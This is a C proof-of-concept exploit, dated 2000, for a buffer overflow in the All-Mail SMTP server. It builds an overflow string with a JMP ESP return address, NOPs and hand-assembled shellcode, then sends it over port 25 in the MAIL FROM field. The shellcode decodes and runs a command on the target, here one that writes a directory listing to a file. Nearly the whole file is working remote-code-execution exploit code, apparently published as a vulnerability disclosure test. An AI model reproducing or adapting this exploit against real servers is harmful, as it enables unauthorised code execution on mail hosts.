#include <windows.h>
#include <winsock.h>
#include <string.h>
#include <stdio.h>

struct sockaddr_in sa;
struct hostent *he;
SOCKET sock;
char hostname[256]="";

int main(int argc, char *argv[])
{
	int chk=0,count=0;
	char
buffer[500]="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPP
PQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ11112222333344445555666677778888999
90000aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrr
rssssttttuuuuvvvvwwwwxxxxyy";
	
	if(argc == 1)
		{
			printf("\n\tUsage: C:\\>%s host\n\tTests for
All-Mail buffer overflow\n\tDavid Litchfield 10th October
2000\n\n",argv[0]);
			return 0;
		}

	strncpy(hostname,argv[1],250);

	// Overwrite the saved return address with 0x77F32836
	// This address contains a JMP ESP instruction that
	// when executed will land us back in our buffer

	buffer[242]=0x36;
	buffer[243]=0x28;
	buffer[244]=0xF3;
	buffer[245]=0x77;

	count = 246;

	// This part of the buffer gets zapped - just put NOPs in

	buffer[count++]=0x90;
	buffer[count++]=0x90;
	buffer[count++]=0x90;
	buffer[count++]=0x90;
	buffer[count++]=0x90;
	buffer[count++]=0x90;
	buffer[count++]=0x90;
	buffer[count++]=0x90;
	buffer[count++]=0x90;


	// This is where our code starts in earnest

	// mov esp,ebp
	buffer[count++]=0x8B;
	buffer[count++]=0xEC;

	// With our stack perserved and our code safe we continue

	// mov ebx,esp
	buffer[count++]=0x8B;
	buffer[count++]=0xDC;

	// mov eax,77F1A986h
	buffer[count++]=0xB8;
	buffer[count++]=0x86;
	buffer[count++]=0xA9;
	buffer[count++]=0xF1;
	buffer[count++]=0x77;

	// xor esi,esi
	buffer[count++]=0x33;
	buffer[count++]=0xF6;

	// push esi
	buffer[count++]=0x56;

	// mov ecx, 0xFFFFFFFF
	buffer[count++]=0xB9;
	buffer[count++]=0xFF;
	buffer[count++]=0xFF;
	buffer[count++]=0xFF;
	buffer[count++]=0xFF;

	// sub ecx, 0x0D7
	buffer[count++]=0x83;
	buffer[count++]=0xE9;
	buffer[count++]=0xD7;

	// loophere:

	// sub dword ptr[ebx+0x50],1
	buffer[count++]=0x83;
	buffer[count++]=0x6B;
	buffer[count++]=0x50;
	buffer[count++]=0x01;

	// sub ebx,1
	buffer[count++]=0x83;
	buffer[count++]=0xEB;
	buffer[count++]=0x01;

	// sub ecx,1
	buffer[count++]=0x83;
	buffer[count++]=0xE9;
	buffer[count++]=0x01;

	// test ecx,ecx
	buffer[count++]=0x85;
	buffer[count++]=0xC9;

	// jne loophere
	buffer[count++]=0x75;
	buffer[count++]=0xF2;

	// add ebx,0x55
	buffer[count++]=0x83;
	buffer[count++]=0xC3;
	buffer[count++]=0x55;

	// push ebx	
	buffer[count++]=0x53;

	// call eax
	buffer[count++]=0xFF;
	buffer[count++]=0xD0;

	// This bunch is our command to run:
	// cmd.exe /c dir > allmail_orun.txt
	// but with 1 added to evey character
	// which is SUBed in the loop above
	buffer[count++]=0x01;
	buffer[count++]=0x01;
	buffer[count++]=0x01;
	buffer[count++]=0x01;
	buffer[count++]=0x64;
	buffer[count++]=0x6e;
	buffer[count++]=0x65;
	buffer[count++]=0x2f;
	buffer[count++]=0x66;
	buffer[count++]=0x79;
	buffer[count++]=0x66;
	buffer[count++]=0x21;
	buffer[count++]=0x30;
	buffer[count++]=0x64;
	buffer[count++]=0x21;
	buffer[count++]=0x65;
	buffer[count++]=0x6a;
	buffer[count++]=0x73;
	buffer[count++]=0x21;
	buffer[count++]=0x3f;
	buffer[count++]=0x21;
	buffer[count++]=0x62;
	buffer[count++]=0x6d;
	buffer[count++]=0x6d;
	buffer[count++]=0x6e;
	buffer[count++]=0x62;
	buffer[count++]=0x6a;
	buffer[count++]=0x6d;
	buffer[count++]=0x60;
	buffer[count++]=0x70;
	buffer[count++]=0x73;
	buffer[count++]=0x76;
	buffer[count++]=0x6f;
	buffer[count++]=0x2f;
	buffer[count++]=0x75;
	buffer[count++]=0x79;
	buffer[count++]=0x75;
	buffer[count++]=0x01;
	buffer[count++]=0x01;
	buffer[count++]=0x01;
	

	if(startWSOCK(hostname)!=0)
		{
			printf("Winsock Error!\n");
			return 0;
		}

	DoBufferOverrun(buffer);

	return 0;

}	



int startWSOCK(char *swhost)
{
	int err=0;
	WORD wVersionRequested;
	WSADATA wsaData;

	wVersionRequested = MAKEWORD( 2, 0 );
	err = WSAStartup( wVersionRequested, &wsaData );
	if ( err != 0 )
		{
			
			return 2;
		}
	if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion )
!= 0 )
		{
   	 		WSACleanup( );
    			return 3;
		}

	if ((he = gethostbyname(swhost)) == NULL)
		{
			printf("Host not found..");
			return 4;
		}
	sa.sin_addr.s_addr=INADDR_ANY;
	sa.sin_family=AF_INET;
	memcpy(&sa.sin_addr,he->h_addr,he->h_length);

	return 0;
}	

int DoBufferOverrun(char *exploit)
{
	
	int snd, rcv, err, count =0,incount = 0;	
	char resp[200],*loc=NULL;

	sa.sin_port=htons(25);
	sock=socket(AF_INET,SOCK_STREAM,0);
	bind(sock,(struct sockaddr *)&sa,sizeof(sa));
	if (sock==INVALID_SOCKET)
		{
			closesocket(sock);
			return 0;
		}

	if(connect(sock,(struct sockaddr *)&sa,sizeof(sa)) < 0)
		{

			closesocket(sock);
			printf("Failed to connect\n");
			return 0;
		}
	else
		{
			rcv = recv(sock,resp,200,0);
			snd = send(sock,"helo
all-mail.overrun.test\r\n",28,0);
			rcv = recv(sock,resp,200,0);
			loc = strstr(resp,"250 HELO accepted");
			if(loc == NULL)
				{
					printf("Server does not appear to be
running All-Mail\nAborting...");
					closesocket(sock);
					return 0;
				}
			else
				{
					snd = send(sock,"mail from:
<",12,0);
					snd =
send(sock,exploit,strlen(exploit),0);
					snd = send(sock,">\r\n",3,0);
					printf("Payload
sent...allmail_orun.txt should have been created.\n");
				}
		}

closesocket(sock);
return 0;
}

